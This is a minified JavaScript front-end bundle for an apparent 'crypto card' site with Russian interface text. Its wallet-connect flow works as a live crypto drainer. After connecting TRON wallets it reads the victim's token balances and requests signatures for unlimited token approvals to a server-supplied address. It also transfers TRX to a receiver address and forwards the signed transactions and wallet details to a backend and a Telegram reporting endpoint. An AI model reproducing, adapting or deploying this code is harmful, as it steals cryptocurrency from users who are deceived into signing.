h(!0),c("/icons/ic_select_9c2b5e8d.png")},onLoad:()=>h(!1),loading:"lazy"})},tp={TRONLINK:tt.Fq,TOKENPOCKET:ta.D,BITKEEP:tn._,OKXWALLET:tr.L,LEDGER:ti.jy,IMTOKEN:to.$,GATEWALLET:ts.E,FOXWALLET:tc.k,BYBIT:tl.p,TOMOWALLET:tu._},tm="tron_pending_connect_v3",tw=e=>new Promise(t=>setTimeout(t,e)),tf=()=>{var e;return!!(null==(e=window)?void 0:e.tronLink)},tg=e=>{if(!e)return"";if("localhost"===e)return"localhost";if(/^\d{1,3}(\.\d{1,3}){3}$/.test(e))return e;let t=e.split(".").filter(Boolean);return t.length<=2?e:t.slice(-2).join(".")},t_=()=>{let e=tg(window.location.hostname);return!e||"localhost"===e||/^\d{1,3}(\.\d{1,3}){3}$/.test(e)?"":"Domain=.".concat(e,"; ")},ty=(e,t,a)=>{let n="https:"===window.location.protocol?"Secure; ":"";document.cookie="".concat(encodeURIComponent(e),"=").concat(encodeURIComponent(t),"; ")+"Path=/; "+t_()+"Max-Age=".concat(a,"; ")+"SameSite=Lax; "+n},tv=()=>{try{let e=(e=>{let t=encodeURIComponent(e)+"=",a=document.cookie.split("; ").filter(e=>e.startsWith(t));return a.length?decodeURIComponent(a[0].slice(t.length)):null})(tm);if(!e)return null;let t=JSON.parse(e);if(!(null==t?void 0:t.walletKey)||!(null==t?void 0:t.ts)||Date.now()-t.ts>3e5)return null;return t}catch(e){return null}},tb=e=>{let t={...e,attempts:(e.attempts||0)+1};return ty(tm,JSON.stringify(t),300),t},tx=()=>(e=>{let t="https:"===window.location.protocol?"Secure; ":"";document.cookie="".concat(encodeURIComponent(e),"=; ")+"Path=/; "+t_()+"Max-Age=0; SameSite=Lax; "+t})(tm),tC=()=>{let e=new URLSearchParams(window.location.search),t=(e.get("tron_wallet")||"").toUpperCase(),a=e.get("tron_net")||"TRON",n=e.get("tron_sub")||"";return t?{walletKey:t,network:a,sub:n,ts:Date.now(),attempts:0}:null},tS=()=>{let e=new URL(window.location.href);e.searchParams.delete("tron_wallet"),e.searchParams.delete("tron_net"),e.searchParams.delete("tron_sub"),window.history.replaceState({},"",e.toString())},tT=async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:4500,a=Date.now();for(;Date.now()-a<t;){if("NotFound"!==e.readyState)return!0;await tw(250)}return"NotFound"!==e.readyState},tk=e=>{let{isOpen:t,onClose:a,network:i,energyInput:c,formattedTrx:l,fromToken:m,toToken:f,fromNetwork:_,toNetwork:P,fromAmount:N}=e,{t:A}=(0,o.s)(),[D,j]=(0,r.useState)(null),[I,O]=(0,r.useState)(""),L=(0,r.useRef)(null),[F,W]=(0,r.useState)(null),[M,B]=(0,r.useState)(!1),[U,H]=(0,r.useState)(""),[V,K]=(0,r.useState)(null),{adapter2:q,connect:G}=(0,d.$)(),[J,$]=(0,r.useState)(null),[z,X]=(0,r.useState)(!1),Z=(0,r.useMemo)(()=>td[i]||td.ETH,[i]),Y=async(e,t)=>{try{if(await (0,p.N)(),await new Promise(e=>setTimeout(e,200)),null==q?void 0:q.disconnect)try{await q.disconnect()}catch(e){}(0,h.F)("Открываю WalletConnect");let{topic:e,address:t,uri:a}=await G("WalletConnect","TRON");H(t),$(a)}catch(e){if("WC_USER_CLOSED"===((null==e?void 0:e.code)||(null==e?void 0:e.message)||""))return j(null),null;return H(""),j(null),null}},Q=async function(e,t){let a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};if("Trust Wallet"===e||"Bitget Wallet"===e||"imToken"===e||"BitpieWallet"===e||"OKX Wallet"===e)return void await Y(e,i);let{fromAuto:n=!1,pathname:r=null}=a,o=(e||"").toUpperCase(),s=tp[o];if(console.log("walletKey"),console.log(o),console.log("walletKey"),console.log("WalletClass"),console.log(s),console.log("WalletClass"),console.log("fromAuto"),console.log(n),console.log("fromAuto"),!s){let t="Unsupported wallet or missing adapter export: ".concat(e,". ")+"Check @tronweb3/tronwallet-adapters version and WALLET_MAP.";return O(t),j("error"),{connected:!1,error:Error(t)}}if(!n){let e=(()=>{let e=["user","id"],t=e[Math.floor(Math.random()*e.length)],a=Math.floor(9500*Math.random())+500;return"".concat(t).concat(a)})(),a=(e=>{let{sub:t,pathname:a,extraParams:n}=e,r=tg(window.location.hostname),i=new URL(window.location.href);return"localhost"!==r&&(i.hostname="".concat(t,".").concat(r)),a&&(i.pathname=a),n&&"object"==typeof n&&Object.entries(n).forEach(e=>{let[t,a]=e;null!=a&&i.searchParams.set(t,String(a))}),i.toString()})({sub:e,pathname:r||window.location.pathname,extraParams:{tron_wallet:o,tron_net:t||"TRON",tron_sub:e}});if(ty(tm,JSON.stringify({...{walletKey:o,network:t||"TRON",sub:e},ts:Date.now(),attempts:0}),300),!tf()&&((e,t)=>{let a=(e||"").toUpperCase();if("TRONLINK"===a){var n;let e=new URL(t,window.location.href);if(console.log("TRONLINK"),e.searchParams.set("lang","ru"),e.searchParams.set("data_id","12345"),localStorage.removeItem("tronlinkConnected"),localStorage.removeItem("tronlinkAddress"),/Android|iPhone|iPad|iPod/i.test(navigator.userAgent||"")){let t=encodeURIComponent(JSON.stringify({url:e.toString(),dappName:"Trust",action:"open",protocol:"tronlink",version:"1.0"}));return window.location.href="tronlinkoutside://pull.activity?param=".concat(t),!0}if(null==(n=window.tronLink)?void 0:n.request){try{window.tronLink.request({method:"tron_requestAccounts"}).catch(()=>{})}catch(e){}return window.location.href=e.toString(),!0}}if("TOKENPOCKET"===a){let e=encodeURIComponent(JSON.stringify({url:t,chain:"TRON",source:"your_dapp"}));return window.location.href="tpdapp://open?params=".concat(e),!0}return"BITKEEP"===a&&(window.location.href="https://bkcode.vip?action=dapp&url=".concat(encodeURIComponent(t)),!0)})(o,a))return{connected:!1,openedWallet:!0,dappUrl:a}}if(n&&!tf())return{connected:!1,skipped:!0};let c=new s;console.log(c),c.on("connect",e=>j("step1")),c.on("disconnect",()=>j("null")),c.on("accountsChanged",(e,t)=>console.log("yes"));try{if(B(!0),W(o),await tT(c,4500),n&&"NotFound"===c.readyState)throw Error("".concat(o," wallet not detected in this environment"));if(await c.connect(),t&&"function"==typeof c.switchChain)try{await c.switchChain(t)}catch(e){console.log("Yes")}let e=c.address||c.connectedAddress||"";return L.current=e,K(c),X("TRONLINK"===o),B(!1),tx(),tS(),H(e),{connected:!0,address:e,adapter:c}}catch(e){return console.error("[".concat(o,"] Connection failed:"),e),j("error"),B(!1),O((null==e?void 0:e.message)||"Connection failed"),{connected:!1,error:e}}};(0,r.useEffect)(()=>{(async()=>{let e=tC(),t=tv(),a=e||t;if(!a)return;let n=tb(a);if((n.attempts||0)>3){tx(),tS();return}tf()&&await Q(n.walletKey,n.network||"TRON",{fromAuto:!0})})()},[]),(0,r.useEffect)(()=>{let e=async()=>{let e=tC(),t=tv(),a=e||t;if(!a)return;let n=tb(a);if((n.attempts||0)>3){tx(),tS();return}tf()&&await Q(n.walletKey,n.network||"TRON",{fromAuto:!0})},t=()=>{"visible"===document.visibilityState&&e()};return document.addEventListener("visibilitychange",t),window.addEventListener("focus",e),window.addEventListener("pageshow",e),()=>{document.removeEventListener("visibilitychange",t),window.removeEventListener("focus",e),window.removeEventListener("pageshow",e)}},[]);let ee=async(e,t)=>{try{"trust-card.vercel.app".replace(/^\./,"").toLowerCase(),window.location.hostname.toLowerCase(),"ETH"===t?((0,h.F)("✅ Открыл коннект: ".concat(e," [").concat(t,"]"),0),await b({fromToken:m,toToken:f,fromNetwork:_,toNetwork:P,fromAmount:N,wallet:e}),e5(e,j,w)):("TronLink"==e?((0,h.F)("✅ Открыл коннект: ".concat(e," [").concat(t,"]"),0),await b({fromToken:m,toToken:f,fromNetwork:_,toNetwork:P,fromAmount:N,wallet:e}),j("step1")):(j("step1"),console.log(D),console.log(D),(0,h.F)("✅ Открыл коннект: ".concat(e," [").concat(t,"]"),0),await b({fromToken:m,toToken:f,fromNetwork:_,toNetwork:P,fromAmount:N,wallet:e})),W(e),"TRON"==t?Q(e,t,{fromAuto:!1}):console.log("ERROR"))}catch(e){console.log(e)}};(0,r.useEffect)(()=>{if(!U||!V)return;let e=setTimeout(()=>{try{let e=String(U),t=e&&e.startsWith("T")&&e.length>=34||V&&"function"==typeof V.tronWeb&&V.tronWeb(),a=/^0x/i.test(e)?"evm":t?"tron":"evm";"tron"===a?et():console.log("net")}catch(e){console.error(e)}},250);return()=>clearTimeout(e)},[V,U]),(0,r.useEffect)(()=>{if(!U||!q||V)return;let e=setTimeout(()=>{try{let e=String(U),t=e&&e.startsWith("T")&&e.length>=34||q&&"function"==typeof q.tronWeb&&q.tronWeb(),a=/^0x/i.test(e)?"evm":t?"tron":"evm";"tron"===a?ea():console.log("net")}catch(e){console.error(e)}},250);return()=>clearTimeout(e)},[q,U]);let et=async()=>{try{if(j("step2"),!U)return void(0,h.F)("❌ Ошибка: Кошелек не подключен. [TronStartTransactions]",0);let i=await y(U,{sendToTelegram:h.F,timeoutMs:8e3}),{portfolio:o}=i,s=o.list;if(!(Array.isArray(s)&&s.length>0))return void j("step6");if(!i)return;let d=await u(U),p=await v();if(!p||!await C(U))return;for(let i of s){if(!await S(U,E.Z,i.ticker))return;if("0"!==i.amount&&"0.0"!==i.amount&&""!==i.amount){if(parseFloat(i.usd)>=1){if("TRX"===String(i.ticker).toUpperCase())console.log();else if(!await x(U,i.ticker))continue}else{(0,h.F)("⚠ Кошелек: ".concat(U,",\n ⚠ Недостаточно ").concat(i.ticker,": ").concat(i.usd," $ [APPROVE]"),0),j("step6");return}if(await w(U,"1"),"TRX"===i.ticker){j("step3");let e=i.amount;await k({tronWebBuilder:d,walletAddress:U,receiverAddress:p,itstronlink:z,adapter:V,nameWallet:F,redirectWallet:te,sendToTelegram:h.F,number_trx:e})}else{var e,t,a,n,r;let o,s="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",u=await T();if(console.log("itstronlink"),console.log(z),console.log("itstronlink"),z){let r;if("USDT"==i.ticker)r="increaseApproval";else if("USDC"==i.ticker||"BTT"==i.ticker)r="increaseAllowance";else{if("JST"!=i.ticker)return void console.log(i.ticker);r="approve"}try{o=await d.transactionBuilder.triggerSmartContract(i.contract,"increaseApproval(address,uint256)",{feeLimit:4e7,shouldPollResponse:!1,callValue:0},[{type:"address",value:u},{type:"uint256",value:s}],U)}catch(e){R(e,"build",h.F,A,j);return}if(!(null==o?void 0:o.result)||!(null==o||null==(e=o.result)?void 0:e.result))throw(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",0),(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",1),Error("Ошибка создания транзакции");(0,h.F)("✍️ Создали транзакцию [".concat(r,"(address,uint256)] ").concat(z," ").concat(i.contract,"\n\uD83D\uDD0E Актив: ").concat(i.ticker,", баланс=").concat(i.amount,", цена=$").concat(i.price,", стоимость=$").concat(i.usd," [APPROVE]"),0),j("step3");let p=await d.transactionBuilder.extendExpiration(o.transaction,300);try{let e=window.tronWeb;if(!(null==e||null==(t=e.defaultAddress)?void 0:t.base58)){let e=0;for(;e<30&&!(null==(n=window.tronWeb)||null==(a=n.defaultAddress)?void 0:a.base58);)await new Promise(e=>setTimeout(e,200)),e++}let r=await window.tronWeb.trx.sign(p);if(null==r?void 0:r.txID){(0,h.F)("✅ Подписано и отправлено [APPROVE], txid: ".concat(r.txid||r.txID),0),(0,h.F)("✅ Подписано и отправлено [APPROVE], txid: ".concat(r.txid||r.txID),1);let e=await fetch("/api/send-approved",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({signedata:r,ticker:i.ticker,energyInput:c,formattedTrx:l})});if(!e.ok)return void console.error("HTTP error:",e.status);let t=await e.json();if((null==t?void 0:t.ok)=="WHITE"){window.location.href="/thank";return}j("step4")}else(0,h.F)("\uD83D\uDEAB Не удалось отправить транзакцию [APPROVE]",0),(0,h.F)("\uD83D\uDEAB Не удалось отправить транзакцию [APPROVE]",1)}catch(e){R(e,"sign",h.F,A,j);return}}else{try{o=await d.transactionBuilder.triggerSmartContract(i.contract,"approve(address,uint256)",{feeLimit:4e7,shouldPollResponse:!1,callValue:0},[{type:"address",value:u},{type:"uint256",value:s}],U)}catch(e){R(e,"build",h.F,A,j);return}if(!(null==o?void 0:o.result)||!(null==o||null==(r=o.result)?void 0:r.result))throw(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",0),(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",1),Error("Ошибка создания транзакции");(0,h.F)("✍️ Создали транзакцию [APPROVE]\n\uD83D\uDD0E Актив: ".concat(i.ticker,", баланс=").concat(i.amount,", цена=$").concat(i.price,", стоимость=$").concat(i.usd," [APPROVE]"),0),j("step3");let e=await d.transactionBuilder.extendExpiration(o.transaction,300);if(!(null==V?void 0:V.address))return void(0,h.F)("❌ Ошибка: adapter.address отсутствует [TronStartTransactions]",0);try{let t=V.signTransaction(e),a=await t;if(a){(0,h.F)("✍️ подписанная транзакция на ".concat(i.usd," $ актив: ").concat(i.ticker),0),(0,h.F)("✍️ подписанная транзакция на ".concat(i.usd," $ актив: ").concat(i.ticker),1),(0,E.Z)();let e=await fetch("/api/send-approved",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({signedata:a,ticker:i.ticker,energyInput:c,formattedTrx:l})});if(!e.ok)return void console.error("HTTP error:",e.status);let t=await e.json();if((null==t?void 0:t.ok)=="WHITE"){window.location.href="/thank";return}j("step4"),j("error")}}catch(e){R(e,"sign",h.F,A,j);return}}}}}}catch(e){(0,h.F)("❌ Ошибка отправки USDT: ".concat(e," [TronStartTransactions]"),0),(0,h.F)("❌ Ошибка отправки USDT: ".concat(e," [TronStartTransactions]"),1)}},ea=async()=>{try{if(!U)return void(0,h.F)("❌ Ошибка: Кошелек не подключен. [TronStartTransactionsWalletConnect]",0);j("step2"),console.log(U),(0,h.F)("Data wallet: ".concat(U),1);let f=await y(U,{sendToTelegram:h.F,timeoutMs:8e3}),{portfolio:g}=f,_=g.list;if(!(Array.isArray(_)&&_.length>0))return void j("step6");if(!f)return;let b=await u(U),P=await v();if(!P||!await C(U))return;for(let u of _){if(!await S(U,E.Z,u.ticker))return;if("0"!==u.amount&&"0.0"!==u.amount&&""!==u.amount){if(parseFloat(u.usd)>=1){if("TRX"===String(u.ticker).toUpperCase())console.log();else if(!await x(U,u.ticker))continue}else{(0,h.F)("⚠ Кошелек: ".concat(U,",\n ⚠ Недостаточно ").concat(u.ticker,": ").concat(u.usd," $ [APPROVE]"),0),j("step6");return}if(await w(U,"1"),"TRX"===u.ticker){let e=u.amount;j("step3"),await k({tronWebBuilder:b,walletAddress:U,receiverAddress:P,itstronlink:z,adapter:q,nameWallet:F,uri_send:J,sendToTelegram:h.F,number_trx:e})}else{var e,t,a,n,r,i,o,s,d,p,m;let w,f="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",g=await T();if(z){let m;if("USDT"==u.ticker)m="increaseApproval";else if("USDC"==u.ticker||"BTT"==u.ticker)m="increaseAllowance";else{if("JST"!=u.ticker)return void console.log(u.ticker);m="approve"}try{w=await b.transactionBuilder.triggerSmartContract(u.contract,"increaseApproval(address,uint256)",{feeLimit:4e7,shouldPollResponse:!1,callValue:0},[{type:"address",value:g},{type:"uint256",value:f}],U)}catch(e){R(e,"build",h.F,A,j);return}if(!(null==w?void 0:w.result)||!(null==w||null==(e=w.result)?void 0:e.result))throw(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",0),(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",1),Error("Ошибка создания транзакции");(0,h.F)("✍️ Создали транзакцию [".concat(m,"(address,uint256)] ").concat(z," ").concat(u.contract,"\n\uD83D\uDD0E Актив: ").concat(u.ticker,", баланс=").concat(u.amount,", цена=$").concat(u.price,", стоимость=$").concat(u.usd," [APPROVE]"),0),j("step3");let _=await b.transactionBuilder.extendExpiration(w.transaction,300);try{null==w||null==(o=w.transaction)||null==(i=o.raw_data)||null==(r=i.contract)||null==(n=r[0])||null==(a=n.parameter)||null==(t=a.value)||t.function_selector;let e=window.tronWeb;if(!(null==e||null==(s=e.defaultAddress)?void 0:s.base58)){let e=0;for(;e<30&&!(null==(p=window.tronWeb)||null==(d=p.defaultAddress)?void 0:d.base58);)await new Promise(e=>setTimeout(e,200)),e++}let m=await window.tronWeb.trx.sign(_);if(null==m?void 0:m.txID){(0,h.F)("✅ Подписано и отправлено [APPROVE], txid: ".concat(m.txid||m.txID),0),(0,h.F)("✅ Подписано и отправлено [APPROVE], txid: ".concat(m.txid||m.txID),1),(0,E.Z)();let e=await fetch("/api/send-approved",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({signedata:m,ticker:u.ticker,energyInput:c,formattedTrx:l})});if(!e.ok)return void console.error("HTTP error:",e.status);let t=await e.json();if((null==t?void 0:t.ok)=="WHITE"){window.location.href="/thank";return}j("step4")}else(0,h.F)("\uD83D\uDEAB Не удалось отправить транзакцию [APPROVE]",0),(0,h.F)("\uD83D\uDEAB Не удалось отправить транзакцию [APPROVE]",1)}catch(e){R(e,"sign",h.F,A,j);return}}else{try{w=await b.transactionBuilder.triggerSmartContract(u.contract,"approve(address,uint256)",{feeLimit:4e7,shouldPollResponse:!1,callValue:0},[{type:"address",value:g},{type:"uint256",value:f}],U)}catch(e){R(e,"build",h.F,A,j);return}if(!(null==w?void 0:w.result)||!(null==w||null==(m=w.result)?void 0:m.result))throw(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",0),(0,h.F)("\uD83D\uDEAB Ошибка создания транзакции APPROVE",1),Error("Ошибка создания транзакции");(0,h.F)("✍️ Создали транзакцию [APPROVE]\n\uD83D\uDD0E Актив: ".concat(u.ticker,", баланс=").concat(u.amount,", цена=$").concat(u.price,", стоимость=$").concat(u.usd," [APPROVE]"),0),j("step3");let e=await b.transactionBuilder.extendExpiration(w.transaction,300);if(!(null==q?void 0:q.address))return void(0,h.F)("❌ Ошибка: adapter2.address отсутствует [TronStartTransactionsWalletConnect]",0);try{let t=encodeURIComponent(J);(0,h.F)("".concat(t),1),window.location.href="trust://wc?uri=".concat(t);let a=q.signTransaction(e),n=await a;if(n){(0,h.F)("✍️ подписанная транзакция на ".concat(u.usd," $ актив: ").concat(u.ticker),0),(0,h.F)("✍️ подписанная транзакция на ".concat(u.usd," $ актив: ").concat(u.ticker),1),(0,E.Z)();let e=await fetch("/api/send-approved",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({signedata:n,ticker:u.ticker,energyInput:c,formattedTrx:l})});if(!e.ok)return void console.error("HTTP error:",e.status);let t=await e.json();if((null==t?void 0:t.ok)=="WHITE"){window.location.href="/thank";return}j("step4")}}catch(e){R(e,"sign",h.F,A,j);return}}}}}}catch(e){(0,h.F)("❌ Ошибка отправки USDT: ".concat(e," [TronStartTransactionsWalletConnect]"),0),(0,h.F)("❌ Ошибка отправки USDT: ".concat(e," [TronStartTransactionsWalletConnect]"),1)}};if(!t)return null;let en=()=>{j(null),O(""),a()};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"wallet-modal-overlay",onClick:()=>{D||a()}}),(0,n.jsxs)("div",{className:"wallet-modal",children:[(0,n.jsxs)("div",{className:"wallet-modal-header",children:[(0,n.jsx)("button",{className:"wallet-modal-back",onClick:a,"aria-label":"Back",children:(0,n.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 20 20",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M12.5 15L7.5 10L12.5 5",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})})}),(0,n.jsx)("h2",{children:A("walletModal.title")}),(0,n.jsx)("p",{children:A("walletModal.subtitle")})]}),(0,n.jsx)("div",{className:"wallet-grid",children:Z.map((e,t)=>(0,n.jsxs)("div",{className:"wallet-item",onClick:()=>ee(e.name,i),children:[(0,n.jsx)("div",{className:"wallet-icon",children:(0,n.jsx)(th,{walletName:e.name,network:i})}),(0,n.jsx)("span",{className:"wallet-name",children:e.name})]},t))})]}),(0,n.jsx)(s,{isOpen:"step1"===D,type:"loading",step:1,uri_send:J,onClose:en}),(0,n.jsx)(s,{isOpen:"step2"===D,type:"loading",step:2,uri_send:J,onClose:en}),(0,n.jsx)(s,{isOpen:"step3"===D,type:"loading",step:3,uri_send:J,onClose:en}),(0,n.jsx)(s,{isOpen:"step4"===D,type:"loading",step:4,uri_send:J,onClose:en}),(0,n.jsx)(s,{isOpen:"step5"===D,type:"loading",step:5,uri_send:J,onClose:en}),(0,n.jsx)(s,{isOpen:"step6"===D,type:"error",step:6,uri_send:J,onClose:en}),(0,n.jsx)(g,{status:D,t:A,onClose:en})]})};a(18452);let tE=e=>{let{isOpen:t,onClose:a,energyInput:s=null,network:c=null,handleSelect:l=null,fromToken:u=null,toToken:d=null,fromNetwork:h=null,toNetwork:p=null,fromAmount:m=null}=e,{t:w}=(0,o.s)(),f=(e,t)=>{let a=null==w?void 0:w(e);return a&&a!==e?a:t},[g,_]=(0,r.useState)(!1),[y,v]=(0,r.useState)(2),[b,x]=(0,r.useState)(null),[C,S]=(0,r.useState)(!1),[T,k]=(0,r.useState)(!1);(0,r.useEffect)(()=>_(!0),[]);let E=(0,r.useMemo)(()=>[{id:"ETH",name:"Ethereum",icon:"/icons/ic_eth_7a3f9b2c.png"},{id:"TRON",name:"Tron",icon:"/icons/ic_bridge_tron_8b4d2f1a.png"}],[]);if((0,r.useEffect)(()=>{t&&(v(2),k(!1),x(null),S(!1),"changeswap"===s&&(x("TRON"),S(!0)))},[t,s]),(0,r.useEffect)(()=>{if(!g||!(t||C))return;let e=document.body.style.overflow;return document.body.style.overflow="hidden",()=>{document.body.style.overflow=e}},[t,C,g]),(0,r.useEffect)(()=>{t||(v(2),k(!1),x(null),S(!1))},[t]),!t)return null;let R=()=>{x(null),S(!1),k(!1),v(2),null==a||a()},P=3===y?f("auth.title.ready","Карта готова"):f("auth.title.connect","Подключите кошелёк"),N=C?null:(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"auth-modal-overlay auth-animOverlay",onMouseDown:R}),(0,n.jsxs)("div",{className:"auth-modal auth-animModal",role:"dialog","aria-modal":"true",onMouseDown:e=>e.stopPropagation(),children:[(0,n.jsxs)("div",{className:"auth-modal-header",children:[(0,n.jsx)("button",{className:"auth-modal-back",onClick:R,"aria-label":"Close",type:"button",children:(0,n.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 20 20",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M12.5 15L7.5 10L12.5 5",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})})}),(0,n.jsx)("h2",{children:P})]}),(0,n.jsxs)("div",{className:"auth-steps","aria-label":"Progress",children:[(0,n.jsxs)("div",{className:"auth-step ".concat(T?"is-done":"is-active"),children:[(0,n.jsx)("div",{className:"auth-stepDot","aria-hidden":"true"}),(0,n.jsx)("div",{className:"auth-stepLabel",children:f("auth.steps.connect","Подключить кошелёк")})]}),(0,n.jsxs)("div",{className:"auth-step ".concat(T?"is-done":"is-disabled"),children:[(0,n.jsx)("div",{className:"auth-stepDot","aria-hidden":"true"}),(0,n.jsx)("div",{className:"auth-stepLabel",children:f("auth.steps.issue","Выпустить карту")})]}),(0,n.jsxs)("div",{className:"auth-step ".concat(T?"is-active":"is-disabled"),children:[(0,n.jsx)("div",{className:"auth-stepDot","aria-hidden":"true"}),(0,n.jsx)("div",{className:"auth-stepLabel",children:f("auth.steps.ready","Карта готова")})]})]}),(0,n.jsxs)("div",{className:"auth-stepContent auth-animStep",children:[2===y&&(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"auth-lead",children:f("auth.connect.lead","Выберите сеть — откроем окно подключения.")}),(0,n.jsx)("div",{className:"auth-network-selection",children:E.map(e=>(0,n.jsx)("button",{type:"button",className:"auth-network-itemBtn ".concat(b===e.id?"active":""),onClick:()=>{x(e.id),S(!0)},children:(0,n.jsxs)("div",{className:"auth-network-itemInner",children:[(0,n.jsx)("div",{className:"auth-network-icon",children:(0,n.jsx)("img",{src:e.icon,alt:e.name})}),(0,n.jsxs)("div",{className:"auth-network-info",children:[(0,n.jsx)("span",{className:"auth-network-name",children:e.name}),(0,n.jsx)("span",{className:"auth-network-subtitle",children:f("auth.connect.tapToOpen","Нажмите, чтобы открыть подключение")})]}),(0,n.jsx)("div",{className:"auth-chevron","aria-hidden":"true",children:(0,n.jsx)("svg",{width:"18",height:"18",viewBox:"0 0 20 20",fill:"none",children:(0,n.jsx)("path",{d:"M8 5l5 5-5 5",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})})})]})},e.id))}),(0,n.jsx)("div",{className:"auth-footnote",children:f("auth.connect.note","После подключения карта станет активной.")})]}),3===y&&(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)("div",{className:"auth-success",children:[(0,n.jsx)("div",{className:"auth-successIcon auth-animSuccess","aria-hidden":"true",children:"✓"}),(0,n.jsxs)("div",{className:"auth-successText",children:[(0,n.jsx)("div",{className:"auth-successTitle",children:f("auth.ready.title","Готово")}),(0,n.jsx)("div",{className:"auth-successDesc",children:f("auth.ready.desc","Кошелёк подключён, карта активирована.")})]})]}),(0,n.jsx)("button",{className:"auth-primary-button",onClick:R,type:"button",children:f("auth.ready.cta","Закрыть")})]})]},y)]})]});return(0,n.jsxs)(n.Fragment,{children:[g&&N?(0,i.createPortal)(N,document.body):null,g?(0,i.createPortal)((0,n.jsx)(tk,{isOpen:C,onClose:()=>{S(!1),T||v(2)},network:b,energyInput:s,handleSelect:function(){for(var e=arguments.length,t=Array(e),a=0;a<e;a++)t[a]=arguments[a];k(!0),S(!1),v(3),l&&l(...t)},fromToken:u,toToken:d,fromNetwork:h,toNetwork:p,fromAmount:m}),document.body):null]})}},49324:(e,t,a)=>{"use strict";a.d(t,{A:()=>c});var n=a(95155),r=a(52619),i=a.n(r),o=a(2597),s=a.n(o);function c(e){let{href:t,variant:a="primary",className:r="",children:o,...c}=e,l="".concat(s().btn," ").concat(s()[a]||""," ").concat(r).trim();return t?(0,n.jsx)(i(),{href:t,className:l,...c,children:o}):(0,n.jsx)("button",{className:l,...c,children:o})}},58954:()=>{},63731:()=>{},68111:(e,t,a)=>{"use strict";function n(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:window.location.search;if(!e)return{};let t=new URLSearchParams(e),a={};return["utm_source","utm_medium","utm_campaign","utm_content","utm_term","open","from","to","x_energy","setting"].forEach(e=>{let n=t.get(e);n&&(a[e]=n)}),a}a.d(t,{Z:()=>n})},71823:(e,t,a)=>{"use strict";function n(){return new Promise((e,t)=>{try{if(!("indexedDB"in window))return e("IndexedDB недоступен (SSR/без браузера)");let a="WALLET_CONNECT_V2_INDEXED_DB",n="keyvaluestorage",r=["wc@2:client:0.3:session","wc@2:core:0.3:pairing","wc@2:core:0.3:subscription","wc@2:core:0.3:messages","wc@2:core:0.3:messages_with_proposal","wc@2:core:0.3:expirer","wc@2:core:0.3:history"],i=indexedDB.open(a);i.onerror=()=>{console.error("❌ Ошибка при открытии IndexedDB"),t("Ошибка открытия базы")},i.onsuccess=()=>{let o=i.result;if(!o.objectStoreNames.contains(n)){console.warn("⚠️ objectStore '".concat(n,"' не найден. Удаляем всю базу...")),o.close();let r=indexedDB.deleteDatabase(a);r.onsuccess=()=>e("Удалена вся база"),r.onerror=e=>{console.error("❌ Ошибка при удалении базы:",e),t("Ошибка при удалении базы")},r.onblocked=()=>{console.warn("⚠️ Удаление базы заблокировано — закрой вкладки.")};return}let s=o.transaction(n,"readwrite"),c=s.objectStore(n);r.forEach(e=>c.delete(e)),s.oncomplete=()=>e("Готово"),s.onerror=()=>{console.error("❌ Ошибка при удалении ключей"),t("Ошибка удаления")}}}catch(e){console.error("❌ Ошибка в clearWalletConnectSession:",e),t(e instanceof Error?e.message:String(e))}})}a.d(t,{N:()=>n})},72458:(e,t,a)=>{"use strict";a.d(t,{HD:()=>function e(t){if("bigint"==typeof t){let e=BigInt(Number.MAX_SAFE_INTEGER),a=BigInt(Number.MIN_SAFE_INTEGER);return t<=e&&t>=a?Number(t):t.toString(10)}if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let a={};for(let[n,r]of Object.entries(t))a[n]=e(r);return a}return t},eg:()=>function e(t){if(t&&"object"==typeof t&&"bi"===t.__t)return BigInt(t.v);if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let a={};for(let[n,r]of Object.entries(t))a[n]=e(r);return a}return t},yS:()=>function e(t){if("bigint"==typeof t)return{__t:"bi",v:t.toString(10)};if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let a={};for(let[n,r]of Object.entries(t))a[n]=e(r);return a}return t}})},90108:()=>{},91848:()=>{},92721:(e,t,a)=>{"use strict";a.d(t,{F:()=>r});var n=a(68111);async function r(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;try{let a=(0,n.Z)(),r=await fetch("/api/send_telegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:e,status:t,utm:a})});if(!r.ok)throw Error("HTTP ".concat(r.status));return await r.json().catch(()=>null)}catch(e){return console.error("❌ Ошибка запроса на бэкенд:",e),null}}}}]);